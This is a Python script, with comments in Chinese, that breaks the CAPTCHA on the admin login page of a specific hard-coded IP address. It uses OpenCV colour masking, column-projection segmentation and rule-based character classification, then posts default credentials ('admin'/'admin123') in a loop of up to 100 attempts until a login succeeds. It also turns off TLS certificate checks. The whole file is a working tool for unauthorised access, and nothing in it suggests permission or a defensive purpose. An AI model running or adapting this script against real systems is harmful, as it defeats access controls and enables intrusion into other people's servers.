#!/usr/bin/env python3
"""101.201.82.174 cv2 投影法验证码识别+登录"""
import urllib.request, http.cookiejar, ssl, io, sys, time, json
import cv2
import numpy as np

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]
B = "https://101.201.82.174"

def get_captcha():
    r = op.open(f"{B}/customer/admin/verify.html", timeout=8)
    return np.frombuffer(r.read(), np.uint8)

def get_mask(img):
    target = np.array([25, 42, 128])
    mask = cv2.inRange(img, target-60, target+60)
    # 去干扰线: 删除过细的横向线段
    kernel_open = cv2.getStructuringElement(cv2.MORPH_RECT, (1,3))
    mask = cv2.morphologyEx(mask, cv2.MORPH_OPEN, kernel_open)
    # 横向膨胀连接字符断裂
    kernel_close = cv2.getStructuringElement(cv2.MORPH_RECT, (3,1))
    mask = cv2.morphologyEx(mask, cv2.MORPH_CLOSE, kernel_close)
    # 再垂直膨胀
    kernel_v = cv2.getStructuringElement(cv2.MORPH_RECT, (1,2))
    mask = cv2.dilate(mask, kernel_v, iterations=1)
    return mask

def seg_by_projection(mask):
    """列投影法分割"""
    h, w = mask.shape
    col_sum = mask.sum(axis=0)
    # 找字符列(像素>0)
    segs = []
    in_seg = False
    for i in range(w):
        if col_sum[i] > 1 and not in_seg:
            start = i; in_seg = True
        elif col_sum[i] <= 1 and in_seg:
            if i - start >= 4: segs.append((start, i-1))
            in_seg = False
    if in_seg and w - start >= 4: segs.append((start, w-1))
    # 合并近段(字符断裂)
    merged = []
    for s in segs:
        if merged and s[0] - merged[-1][1] <= 4:
            merged[-1] = (merged[-1][0], s[1])
        else:
            merged.append(s)
    return merged

def char_art(mask, seg):
    s, e = seg
    h = mask.shape[0]
    rows = []
    for y in range(h):
        line = "".join("#" if mask[y,x] else "." for x in range(s,e+1))
        if "#" in line: rows.append(line)
    return rows

def classify_char(rows):
    if not rows: return "?"
    H = len(rows)
    W = max(len(r) for r in rows)
    norm = [r + "."*(W-len(r)) for r in rows]
    top = norm[0]; bot = norm[-1]; mid = norm[H//2]
    left_col = sum(1 for r in norm if r[0]=="#") / H
    right_col = sum(1 for r in norm if r[-1]=="#") / H
    has_top_l = "#" in top[:max(1,W//2)]
    has_top_r = "#" in top[max(0,W//2):]
    has_bot_l = "#" in bot[:max(1,W//2)]
    has_bot_r = "#" in bot[max(0,W//2):]
    has_mid = "#" in mid[:max(1,W//2)]
    mid_r = "#" in mid[max(0,W//2):]
    Wn = W / H  # 宽高比

    # 数字
    if Wn < 0.35 and left_col > 0.6: return "1"
    if left_col > 0.6 and right_col > 0.6:
        if has_top_l and has_bot_l and has_mid: return "8"
        if has_top_l and not has_bot_l and mid_r: return "6"
        if not has_top_l and has_bot_l and not has_mid: return "9"
        if has_top_l and has_bot_l and not has_mid and has_top_r: return "0"
    if left_col > 0.6 and right_col < 0.4 and has_top_l and not has_bot_l and mid_r: return "2"
    if left_col > 0.6 and not has_top_l and has_bot_l: return "3"
    if left_col < 0.4 and right_col > 0.6 and has_top_l and has_bot_l: return "5"
    if left_col > 0.6 and right_col > 0.6 and has_top_l and not has_mid and not has_bot_l and has_top_r: return "7"
    # 字母
    if left_col > 0.5 and right_col > 0.5 and not has_top_l and not has_bot_l and has_mid: return "H"
    if left_col < 0.4 and right_col < 0.4 and not has_top_l and not has_bot_l: return "X"
    if left_col < 0.4 and right_col < 0.4 and has_top_l and has_top_r: return "T"
    if left_col < 0.4 and right_col < 0.4 and not has_top_l and has_bot_l: return "Y"
    if left_col > 0.5 and right_col < 0.4 and not has_top_l and not has_bot_l and mid_r: return "K"
    if left_col > 0.6 and right_col < 0.5 and has_top_l and has_bot_l: return "E"
    if left_col > 0.6 and right_col < 0.5 and has_top_l and not has_bot_l: return "F"
    if left_col > 0.5 and right_col > 0.5 and has_top_l and not has_bot_l and not has_mid: return "U"
    if left_col > 0.5 and right_col > 0.5 and not has_top_l and not has_bot_l and not has_mid and not has_top_r:
        return "N"
    if left_col > 0.5 and right_col > 0.5 and not has_top_l and not has_mid and not has_bot_l:
        return "A"
    if left_col > 0.6 and right_col > 0.6 and has_top_l and not has_bot_l and not has_mid and has_top_r:
        return "O"
    if left_col > 0.5 and right_col > 0.5 and has_top_l and not has_mid and has_bot_l and has_top_r: return "B"
    if left_col > 0.5 and right_col > 0.5 and has_top_l and not has_mid and has_bot_l and not has_top_r: return "P"
    if Wn > 0.8: return "W" if left_col > 0.3 else "M"
    return "?"

def login(user, pwd, code):
    data = f"username={user}&password={pwd}&verify={code}".encode()
    try:
        r = op.open(urllib.request.Request(f"{B}/customer/admin/dologin.html", data=data), timeout=8)
        return json.loads(r.read().decode("utf-8","ignore"))
    except Exception as e:
        return {"status":-1,"msg":str(e)[:60]}

user = sys.argv[1] if len(sys.argv) > 1 else "admin"
pwd = sys.argv[2] if len(sys.argv) > 2 else "admin123"

for i in range(100):
    data = get_captcha()
    img = cv2.imdecode(data, cv2.IMREAD_COLOR)
    if img is None: continue
    mask = get_mask(img)
    segs = seg_by_projection(mask)
    if len(segs) != 4:
        # 打印段数供调试
        if i % 10 == 0: print(f"[{i}] segs={len(segs)}", flush=True)
        continue
    code = ""
    for s in segs:
        rows = char_art(mask, s)
        code += classify_char(rows)
    r = login(user, pwd, code)
    if r.get("status") == 1:
        print(f"!!! 登录成功 {user}/{pwd} code={code}", flush=True)
        break
    elif "验证码" in str(r.get("msg","")):
        print(f"[{i}] code={code} 验证码错", flush=True)
    else:
        print(f"[{i}] code={code} -> {r}", flush=True)
        if "验证码" not in str(r.get("msg","")):
            print(f"  !!! 非验证码错误: {r}", flush=True)
    time.sleep(0.3)
print("DONE")
